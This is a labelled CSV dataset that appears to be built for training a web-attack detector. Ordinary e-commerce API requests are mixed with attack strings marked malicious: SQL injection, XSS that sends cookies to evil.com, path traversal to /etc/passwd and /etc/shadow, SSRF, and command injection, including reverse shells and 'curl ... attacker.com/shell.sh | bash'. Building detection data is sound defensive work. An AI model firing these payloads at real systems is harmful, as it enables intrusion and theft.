"text","label"
"PUT /api/orders?limit=20&offset=0","0"
"GET /actuator/env HTTP/1.1","1"
"GET /.git/config HTTP/1.1","1"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"POST /settings body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"search=' OR ''='","1"
"page=29&limit=10","0"
"q=smartphone&brand=samsung","0"
"path=..%2F..%2F..%2Fetc%2Fpasswd","1"
"login attempt failed username admin invalid credentials","1"
"order_id=ORD-1421 status=confirmed","0"
"category=phones page=4","0"
"GET /api/files?name=../../.git/config","1"
"username=root&password=123456","1"
"url=gopher://127.0.0.1:25/","1"
"GET /web.config HTTP/1.1","1"
"DELETE /api/data User-Agent: PostmanRuntime/7.36.0","0"
"PUT /api/users?search=laptop&sort=price","0"
"username=root&password=admin","1"
"order_id=ORD-2184 status=confirmed","0"
"GET /api/search/4060","0"
"user=1 UNION SELECT @@version,NULL--","1"
"Authorization: Bearer validtoken225","0"
"limit=20&offset=0","0"
"DELETE /dashboard User-Agent: python-requests/2.31.0","0"
"page=50&limit=20","0"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"search=headphones","0"
"include=../../../../var/log/apache2/access.log","1"
"user_id=221&action=view","0"
"User-Agent: masscan/1.3","1"
"Authorization: Bearer validtoken938","0"
"GET /api/search?q=<iframe srcdoc='<script>alert(1)</script>'></iframe>","1"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"order_id=ORD-4478 status=confirmed","0"
"url=file:///etc/passwd","1"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"1' /*!OR*/ 1=1--","1"
"exec=; python -c 'import socket,subprocess'","1"
"description=<<SCRIPT>alert('XSS');//<</SCRIPT>","1"
"user_id=356&action=view","0"
"username=administrator&password=superman","1"
"page=18&limit=20","0"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"POST /api/data body=command; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"User-Agent: sqlmap/1.8.3#stable","1"
"search=phone","0"
"GET /console HTTP/1.1","1"
"include=../../../etc/shadow","1"
"GET /dashboard/509","0"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"order_id=ORD-7057 status=confirmed","0"
"GET /settings/6918","0"
"GET /api/search/1492","0"
"host=; python -c 'import socket,subprocess'","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET ../../../../etc/shadow","1"
"host=& ipconfig","1"
"GET ..%2F..%2F..%2Fetc%2Fpasswd","1"
"GET /.git/config HTTP/1.1","1"
"exec=| uname -a","1"
"GET /api/users?id=1'/**/OR/**/1=1--","1"
"cmd=; ls -la","1"
"url=gopher://127.0.0.1:25/","1"
"GET /.git/config HTTP/1.1","1"
"POST /api/login body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"path=file:///etc/passwd","1"
"POST /api/feedback body=<iframe srcdoc='<script>alert(1)</script>'></iframe>","1"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"search=laptop","0"
"path=../../../etc/shadow","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"POST /api/login username=1'	OR	1=1-- password=test","1"
"search=headphones","0"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"filename=; python -c 'import socket,subprocess'","1"
"url=dict://127.0.0.1:11211/","1"
"POST /api/login username=' UNION ALL SELECT NULL,NULL,NULL-- password=test","1"
"name=Ahmed email=410@mail.com","0"
"GET /console HTTP/1.1","1"
"GET /health HTTP/1.1","0"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"include=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"Authorization: Bearer validtoken193","0"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"url=http://localhost:8080","1"
"search=1'||'1'='1","1"
"name=Ahmed email=133@mail.com","0"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"category=phones page=4","0"
"username=' OR 1=1 LIMIT 1--","1"
"file=../../.git/config","1"
"PUT /api/data?status=pending&priority=high","0"
"username=administrator&password=123456","1"
"GET /api/products/19","0"
"PUT /api/search?date=2024-01-15&type=order","0"
"category=phones page=2","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"Authorization: Bearer validtoken380","0"
"name=Nour email=612@mail.com","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"User-Agent: Nikto/2.5.0","1"
"host=`curl -s http://attacker.com/shell.sh | bash`","1"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"search=tablet","0"
"Authorization: Bearer validtoken476","0"
"Authorization: Bearer validtoken153","0"
"GET /api/orders/9781","0"
"user_id=935&action=view","0"
"date=2024-01-15&type=order","0"
"url=http://127.0.0.1/admin","1"
"category=phones page=7","0"
"GET /api/files?name=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"POST /api/users body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"GET /health HTTP/1.1","0"
"name=<script>alert('XSS')</script>","1"
"order_id=1' AND 1=1 UNION SELECT 1-- -","1"
"DELETE /api/search User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"username=administrator&password=admin","1"
"username=admin&password=letmein","1"
"url=file:///etc/passwd","1"
"Authorization: Bearer validtoken511","0"
"POST /api/data body=command; python -c 'import socket,subprocess'","1"
"username=administrator&password=abc123","1"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"path=php://filter/convert.base64-encode/resource=config.php","1"
"file=file:///etc/passwd","1"
"Authorization: Bearer validtoken166","0"
"%3Cscript%3Ealert(1)%3C/script%3E","1"
"{""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"GET /console HTTP/1.1","1"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"repeated authentication failure admin account locked","1"
"GET /health HTTP/1.1","0"
"GET /settings/6949","0"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"filename=| wget http://attacker.com/shell.sh","1"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"search=phone","0"
"GET /api/users/4995","0"
"GET /health HTTP/1.1","0"
"url=http://10.0.0.1","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /health HTTP/1.1","0"
"name=<script>alert(1)</script>","1"
"order_id=ORD-1184 status=confirmed","0"
"DELETE /api/users User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"ping=& whoami","1"
"comment=<body onload=alert(1)>","1"
"name=<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"POST /api/data body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"order_id=' OR 1=1--","1"
"order_id=ORD-9783 status=confirmed","0"
"' OR ''='","1"
"search=headphones","0"
"search=laptop","0"
"Authorization: Bearer validtoken120","0"
"id=' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--","1"
"user=ahmed&filter=active","0"
"comment=javascript:alert(1)","1"
"GET /api/search/6141","0"
"GET /health HTTP/1.1","0"
"GET /api/search?q=javascript:alert(1)","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /health HTTP/1.1","0"
"POST /api/data body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"Authorization: Bearer validtoken857","0"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"username=') OR ('1'='1","1"
"POST /api/login body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"search=tablet","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"comment=javascript:alert(document.cookie)","1"
"category=tablets page=10","0"
"User-Agent: masscan/1.3","1"
"POST /profile?date=2024-01-15&type=order","0"
"file=/etc/passwd%00","1"
"name=Omar email=409@mail.com","0"
"POST /api/products body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"path=../../.git/config","1"
"page=13&limit=20","0"
"category=tablets page=10","0"
"limit=20&offset=0","0"
"GET /.git/config HTTP/1.1","1"
"user_id=821&action=view","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"username=user&password=monkey","1"
"GET /profile/2599","0"
"order_id=ORD-7597 status=confirmed","0"
"POST /api/search body={""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"id=123&format=json","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"exec=; ping -c 4 attacker.com","1"
"GET /dashboard/1128","0"
"name=Lina email=475@mail.com","0"
"file=../../.git/config","1"
"order_id=ORD-3756 status=confirmed","0"
"GET /health HTTP/1.1","0"
"Content-Type: application/json {""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"order_id=ORD-5450 status=confirmed","0"
"include=file:///etc/passwd","1"
"login attempt failed username admin invalid credentials","1"
"' UNION SELECT username,password FROM users--","1"
"name=Lina email=899@mail.com","0"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"page=1&limit=20","0"
"page=33&limit=10","0"
"POST /dashboard?status=pending&priority=high","0"
"description=<script>alert('XSS')</script>","1"
"title=<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"username=user&password=password123","1"
"filename=`id`","1"
"GET /health HTTP/1.1","0"
"fetch=http://internal-service:8080/secret","1"
"GET /api/data?status=pending&priority=high","0"
"user_id=668&action=view","0"
"POST /settings body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"url=http://127.0.0.1/admin","1"
"user_id=474&action=view","0"
"ping=$(curl -s http://attacker.com/shell.sh)","1"
"url=dict://127.0.0.1:11211/","1"
"search=phone","0"
"url=http://10.0.0.1","1"
"name=Lina email=962@mail.com","0"
"name=Ahmed email=715@mail.com","0"
"exec=`id`","1"
"; python -c 'import socket,subprocess'","1"
"filename=|| nc -e /bin/sh attacker.com 4444","1"
"GET /api/data?status=pending&priority=high","0"
"GET /phpmyadmin HTTP/1.1","1"
"name=<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"GET /dashboard/8699","0"
"name=Nour email=59@mail.com","0"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /health HTTP/1.1","0"
"user_id=986&action=view","0"
"username=user&password=123456","1"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"category=tablets page=10","0"
"include=..%2F..%2F..%2Fetc%2Fpasswd","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"POST /api/login username=1; IF (1=1) WAITFOR DELAY '0:0:5'-- password=test","1"
"search=<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"GET /health HTTP/1.1","0"
"path=../../.git/config","1"
"POST /api/login username=1 UNION SELECT 1,2,3-- password=test","1"
"status=pending&priority=high","0"
"cmd=| wget http://attacker.com/shell.sh","1"
"user_id=59&action=view","0"
"GET /health HTTP/1.1","0"
"order_id=ORD-9090 status=confirmed","0"
"password spray attack detected multiple users","1"
"GET /backup.sql HTTP/1.1","1"
"order_id=ORD-8263 status=confirmed","0"
"GET /profile?status=pending&priority=high","0"
"PUT /api/data User-Agent: PostmanRuntime/7.36.0","0"
"GET /.env HTTP/1.1","1"
"category=tablets page=8","0"
"user_id=378&action=view","0"
"order_id=ORD-1141 status=confirmed","0"
"GET /api/users?id=admin'#","1"
"User-Agent: sqlmap/1.8.3#stable","1"
"user_id=765&action=view","0"
"PUT /settings User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"Authorization: Bearer validtoken217","0"
"Authorization: Bearer validtoken871","0"
"POST /api/data body=command; ls -la","1"
"POST /api/feedback body=<div onmouseover=alert(1)>hover</div>","1"
"search=phone","0"
"GET /admin HTTP/1.1","1"
"GET /health HTTP/1.1","0"
"GET /health HTTP/1.1","0"
"GET /api/search/6963","0"
"cmd=`id`","1"
"username=administrator&password=abc123","1"
"repeated authentication failure admin account locked","1"
"GET /.git/config HTTP/1.1","1"
"username=administrator&password=abc123","1"
"User-Agent: sqlmap/1.8.3#stable","1"
"user=1' AND 1=1 UNION SELECT 1-- -","1"
"GET /api/files?name=../../../.env","1"
"POST /dashboard body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"path=../../../../etc/passwd","1"
"name=Sara email=161@mail.com","0"
"file=../../../etc/shadow","1"
"category=phones page=7","0"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET /api/search?status=pending&priority=high","0"
"endpoint=http://localhost:9200/_cat/indices","1"
"Authorization: Bearer validtoken325","0"
"GET /health HTTP/1.1","0"
"fetch=http://internal-service:8080/secret","1"
"POST /api/data body=command|| nc -e /bin/sh attacker.com 4444","1"
"url=http://localhost:8080","1"
"status=pending&priority=high","0"
"POST /api/login username=' OR 1=1 LIMIT 1-- password=test","1"
"cmd=| cat /etc/passwd","1"
"POST /api/login username=' OR ''=' password=test","1"
"id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--","1"
"filename=| uname -a","1"
"order_id=ORD-2098 status=confirmed","0"
"username=admin&password=password","1"
"order_id=ORD-2262 status=confirmed","0"
"order_id=ORD-3349 status=confirmed","0"
"Authorization: Bearer validtoken336","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /wp-admin HTTP/1.1","1"
"multiple failed login attempts detected for admin","1"
"page=10&limit=50","0"
"search=phone","0"
"url=http://127.0.0.1/admin","1"
"page=42&limit=20","0"
"' OR 1=1 LIMIT 1--","1"
"category=tablets page=3","0"
"POST /api/login body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"category=laptops page=7","0"
"page=7&limit=10","0"
"url=http://10.0.0.1","1"
"GET /admin HTTP/1.1","1"
"cmd=; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"include=../../../../etc/shadow","1"
"User-Agent: sqlmap/1.8.3#stable","1"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"POST /api/feedback body=<a href='javascript:alert(1)'>click</a>","1"
"name=<img src=x onerror=alert(1)>","1"
"username=1'	OR	1=1--","1"
"PUT /profile User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"page=15&limit=10","0"
"username=root&password=1234567890","1"
"GET /api/search?q=<img src=`javascript:alert(1)`>","1"
"POST /api/orders User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"POST /api/login username=1 AND 1=CONVERT(int,@@version)-- password=test","1"
"category=laptops page=9","0"
"GET /api/data?id=123&format=json","0"
"search=<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>","1"
"POST /api/search?id=123&format=json","0"
"GET /api/users/9189","0"
"page=3&limit=20","0"
"GET /api/products?q=smartphone&brand=samsung","0"
"login attempt failed username admin invalid credentials","1"
"id=123&format=json","0"
"GET /health HTTP/1.1","0"
"name=Nour email=394@mail.com","0"
"url=http://127.0.0.1/admin","1"
"POST /api/data?id=123&format=json","0"
"include=../../../../etc/shadow","1"
"name=Ahmed email=929@mail.com","0"
"date=2024-01-15&type=order","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"GET /health HTTP/1.1","0"
"page=39&limit=20","0"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"POST /api/orders body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"page=5&limit=20","0"
"page=27&limit=20","0"
"order_id=ORD-7852 status=confirmed","0"
